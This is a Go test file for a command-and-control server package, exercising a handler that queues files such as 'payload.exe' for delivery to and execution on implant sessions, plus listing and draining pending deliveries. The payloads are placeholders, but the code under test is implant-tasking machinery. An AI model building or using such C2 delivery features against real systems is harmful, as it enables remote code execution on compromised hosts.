package c2

import (
	"bytes"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"
)

func newTestListenerWithSession() (*Listener, string) {
	l := &Listener{}
	l.sessions = make(map[string]*ImplantSession)
	l.commands = make(map[string][]QueuedCommand)
	l.results = make(map[string][]CommandResult)
	l.files = make(map[string][]FileDelivery)

	sessionID := "deploy-test-session-001"
	l.sessions[sessionID] = &ImplantSession{
		ID:       sessionID,
		Hostname: "TARGET",
	}
	return l, sessionID
}

func TestHandleDeploy_Success(t *testing.T) {
	listener, sessionID := newTestListenerWithSession()

	// Build multipart form with file
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	writer.WriteField("session_id", sessionID)
	writer.WriteField("file_path", "/tmp/payload.exe")
	writer.WriteField("execute", "true")

	part, err := writer.CreateFormFile("file", "payload.exe")
	if err != nil {
		t.Fatalf("create form file: %v", err)
	}
	part.Write([]byte("MZ\x90\x00fake-payload-data"))
	writer.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/deploy", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	w := httptest.NewRecorder()

	listener.handleDeploy(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if resp["status"] != "queued" {
		t.Errorf("expected status 'queued', got %v", resp["status"])
	}
	if resp["file_name"] != "payload.exe" {
		t.Errorf("expected file_name 'payload.exe', got %v", resp["file_name"])
	}
	if resp["execute"] != true {
		t.Error("expected execute=true")
	}

	// Verify file is in pending deliveries
	files := listener.drainFiles(sessionID)
	if len(files) != 1 {
		t.Fatalf("expected 1 pending file, got %d", len(files))
	}
	if files[0].FileName != "payload.exe" {
		t.Errorf("expected file name 'payload.exe', got %s", files[0].FileName)
	}
	if files[0].FilePath != "/tmp/payload.exe" {
		t.Errorf("expected file path '/tmp/payload.exe', got %s", files[0].FilePath)
	}
	if !files[0].Execute {
		t.Error("expected execute=true on delivery")
	}
}

func TestHandleDeploy_SessionNotFound(t *testing.T) {
	listener, _ := newTestListenerWithSession()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	writer.WriteField("session_id", "nonexistent")
	writer.WriteField("file_path", "/tmp/test")
	part, _ := writer.CreateFormFile("file", "test.bin")
	part.Write([]byte("data"))
	writer.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/deploy", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	w := httptest.NewRecorder()

	listener.handleDeploy(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeploy_MethodNotAllowed(t *testing.T) {
	listener, _ := newTestListenerWithSession()

	req := httptest.NewRequest(http.MethodGet, "/api/deploy", nil)
	w := httptest.NewRecorder()

	listener.handleDeploy(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestHandleDeploy_MissingFields(t *testing.T) {
	listener, _ := newTestListenerWithSession()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	writer.WriteField("session_id", "")
	writer.WriteField("file_path", "")
	part, _ := writer.CreateFormFile("file", "test.bin")
	part.Write([]byte("data"))
	writer.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/deploy", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	w := httptest.NewRecorder()

	listener.handleDeploy(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for missing fields, got %d", w.Code)
	}
}

func TestHandleListFiles_Empty(t *testing.T) {
	listener, _ := newTestListenerWithSession()

	req := httptest.NewRequest(http.MethodGet, "/api/files", nil)
	w := httptest.NewRecorder()

	listener.handleListFiles(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var pending map[string]int
	if err := json.Unmarshal(w.Body.Bytes(), &pending); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if len(pending) != 0 {
		t.Errorf("expected 0 pending deliveries, got %d", len(pending))
	}
}

func TestHandleListFiles_WithPending(t *testing.T) {
	listener, sessionID := newTestListenerWithSession()

	// Add a pending delivery
	listener.files[sessionID] = []FileDelivery{
		{ID: "delivery-001", FileName: "test.bin", FilePath: "/tmp/test"},
	}

	req := httptest.NewRequest(http.MethodGet, "/api/files", nil)
	w := httptest.NewRecorder()

	listener.handleListFiles(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var pending map[string]int
	json.Unmarshal(w.Body.Bytes(), &pending)
	if pending[sessionID] != 1 {
		t.Errorf("expected 1 pending for session, got %d", pending[sessionID])
	}
}

func TestHandleListFiles_MethodNotAllowed(t *testing.T) {
	listener, _ := newTestListenerWithSession()

	req := httptest.NewRequest(http.MethodPost, "/api/files", nil)
	w := httptest.NewRecorder()

	listener.handleListFiles(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestDrainFiles(t *testing.T) {
	listener, sessionID := newTestListenerWithSession()

	listener.files[sessionID] = []FileDelivery{
		{ID: "d1", FileName: "a.bin"},
		{ID: "d2", FileName: "b.bin"},
	}

	files := listener.drainFiles(sessionID)
	if len(files) != 2 {
		t.Errorf("expected 2 files, got %d", len(files))
	}

	// After drain, should be empty
	files2 := listener.drainFiles(sessionID)
	if len(files2) != 0 {
		t.Errorf("expected 0 files after drain, got %d", len(files2))
	}
}

func TestHandleFileDeliveries(t *testing.T) {
	dir := t.TempDir()
	targetPath := dir + "/delivered.txt"

	deliveries := []FileDelivery{
		{
			ID:       "test-delivery",
			FileName: "delivered.txt",
			FilePath: targetPath,
			Data:     "SGVsbG8gV29ybGQ=", // base64("Hello World")
			Execute:  false,
		},
	}

	handleFileDeliveries(deliveries)

	data, err := os.ReadFile(targetPath)
	if err != nil {
		t.Fatalf("read delivered file: %v", err)
	}
	if string(data) != "Hello World" {
		t.Errorf("expected 'Hello World', got %q", string(data))
	}
}
